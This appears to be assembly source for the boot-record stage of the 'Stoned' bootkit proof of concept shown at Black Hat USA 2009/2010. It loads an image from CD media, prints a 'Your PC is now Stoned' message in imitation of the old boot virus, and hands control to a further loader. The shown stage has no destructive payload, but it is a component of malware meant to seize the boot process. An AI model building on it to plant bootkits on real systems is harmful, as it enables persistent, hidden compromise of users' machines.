%include "Kernel Storage.asm"
[bits 16]                                       ; create a 16 Bit Code
CPU 386                                         ; Assemble instructions up to the 386 instruction set

org 7e00h

jmp 0000h:7c00h
jmp 0000h:7e05h

; store registers for executing later other boot loaders
pushad
mov [cs:Boot_Stack_Pointer],esp


; disable Interrupts & clear the direction flag
cli
cld


; set the Stack to 0000h:Stack_Pointer
xor eax,eax
xor ebx,ebx
mov ss,ax
mov sp,Stack_Pointer - 20h                                                      ; sp might already be 7C00h! preserving pushed registers with -20h

; set the Data Segments to zero
mov ds,bx
mov es,bx
mov fs,bx
mov gs,bx



; (Table 00653)
; Values Bootstrap loader is called with (IBM BIOS):
;       CS:IP = 0000h:7C00h
;       DH = access
;           bits 7-6,4-0: don't care
;           bit 5: =0 device supported by INT 13
;       DL = boot drive
;           00h first floppy
;           80h first hard disk


; store the boot drive
mov [Boot_Drive],edx



; debug: stage 0
%ifdef _DEBUG
mov si,Stage_0_Message
call Print_Text
%endif




; [this boot record is a flat memory image]

; dynamic check removed: now hardcoded using defines
%if 0 = 1
; Floppy      Everything has been loaded by the file system boot loader
; CD/DVD/BD   Only first 2048 bytes have been loaded
; Hard disk   Everything has been loaded already

; if floppy -> already loaded
test dl,80h
jz Flat_Memory_Image_Loaded

; if hard disk -> already loaded
sub sp,74                                                                       ; allocate 74 bytes from the stack
mov si,sp
mov [si + 0],word 74                                                            ; 00h	WORD	(call) size of buffer
mov ah,48h                                                                      ; AH = 48h Get Device Parameters
int 13h
jc Disk_Error
add sp,84                                                                       ; remove the allocated variable

cmp [si + 40],dword "ATA "
je Flat_Memory_Image_Loaded
cmp [si + 40],dword "ATAP"                                                      ; load only on ATAPI devices (CD/DVD/BD)
je Flat_Memory_Image_Not_Loaded
test [si + 02h],dword 00000100b                                                 ; check Bit 2 of Word on Offset 2 (Bit 2: "Media shall be removable.")
jz Flat_Memory_Image_Loaded
;jmp Flat_Memory_Image_Loaded
%endif


%ifdef _BOOT_ATAPI


%ifdef _DEBUG
mov si,Stage_0_Sub_0
call Print_Text
%endif

; handle CD/DVD/BD
mov [Disk_Address_Packet_LBA_Low],dword 17
mov [Disk_Address_Packet_Buffer],dword Bootloader + 2048
mov si,Disk_Address_Packet_Size

; load Boot Record Volume Descriptor
mov ah,42h
int 13h
jc Read_Error

; load Boot Catalog
mov eax,dword [Bootloader + 2048 + 47h]
mov dword [Disk_Address_Packet_LBA_Low],eax
mov ah,42h
int 13h
jc Read_Error

; load the image
mov eax,dword [Bootloader + 2048 + 20h + 8]
inc eax
mov dword [Disk_Address_Packet_LBA_Low],eax
mov [Disk_Address_Packet_Count],word 60*512/2048
mov ah,42h
int 13h
jc Read_Error


%endif






; User message: loading done
%ifdef _DEBUG
mov si,Stage_0_Sub_1
call Print_Text
%endif



; make an integrity check
;**TODO



; check for signed code
;**TODO



; display worlds-famous Stond message, now again after 1987 - 2009  =)

; display the message only if multiple of 440 ms time delay
test [es:046Ch],byte 00000111b
%ifndef BlackHatUSA2009POC                                                      ; for Black Hat USA 2009/2010: display message always
jnz Message_Output_Finished
%endif

; Your PC is now Stoned!  ..again
mov si,Stoned_Message
call Print_Text

%ifdef BlackHatUSA2009POC
; continue with a key press
xor ah,ah                                       ; Function 00h: Get Keystroke
int 16h
%endif

Message_Output_Finished:



; jump to the Loader Module
jmp 0000h:System_Loader






Disk_Error:

; if any other disk error occurs

mov si,MSG_Disk_Error
jmp Public_Error



Read_Error:

; if there was an read error

mov si,MSG_Read_Error
;jmp Public_Error




; the public error handler (si = specific text)
Public_Error:

call Print_Text

mov si,MSG_Reboot
call Print_Text


; reboot after a key press
xor ah,ah                                       ; Function 00h: Get Keystroke
int 16h

; jump to the BIOS reboot
jmp word 0FFFFh:0000h




Print_Text:

; prints the text given in si

mov bx,0007h                                    ; Page Number = 0, Attribute = 07h
mov ah,0Eh                                      ; Function 0Eh: Teletype Output

cs lodsb                                        ; load the first character

Next_Char:
int 10h
cs lodsb                                        ; al = next character
or al,al                                        ; last letter?
jnz Next_Char                                   ; if not print next letter

ret




; Error Messages
MSG_Read_Error          db      10, 13, "Read Error", 0
MSG_Disk_Error          db      10, 13, "Disk Error", 0
MSG_Reboot              db      10, 13, "Press a key to restart", 0


; Stoned message (7 = BEL, 13 = CF, 10 = LF)
Stoned_Message      db  7, "Your PC is now Stoned 2010!  ..again", 7, 13, 10, 0

%ifdef _DEBUG
Stage_0_Message         db      'Bootloader:', 0
Stage_0_Sub_0           db      ' starting from removable-media', 0
Stage_0_Sub_1           db      ' loading complete', 13, 10, 0
%endif


; int 13h variables
Disk_Address_Packet_Size      db  10h   ; +00h
Disk_Address_Packet_Reserved  db  0     ; +01h
Disk_Address_Packet_Count     dw  1     ; +02h
Disk_Address_Packet_Buffer    dd  7C00h ; +04h
Disk_Address_Packet_LBA_Low   dd  0     ; +08h
Disk_Address_Packet_LBA_High  dd  0     ; +0Ch






times 510-($-$$) db 0

Boot_Signature  dw      0AA55h



times 1024-2-($-$$) db 0

Boot_Signature_2  dw      0AA55h
